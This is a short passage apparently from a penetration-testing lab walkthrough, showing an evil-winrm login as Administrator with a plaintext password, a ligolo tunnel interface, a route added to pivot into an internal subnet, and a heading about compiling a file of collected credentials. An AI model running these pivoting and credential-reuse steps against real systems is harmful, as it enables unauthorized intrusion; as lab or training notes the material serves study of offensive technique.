...
# Connect to Target
evil-winrm -i 192.168.165.153 -u 'Administrator' -p 'December31'
...
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:86:95:43              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.125.153/24               │
└──────────────┴────────────────────────────────┘

# Add ip route
sudo ip route add 10.10.125.0/24 dev ligolo

```

## Create Username and Password file of collected creds
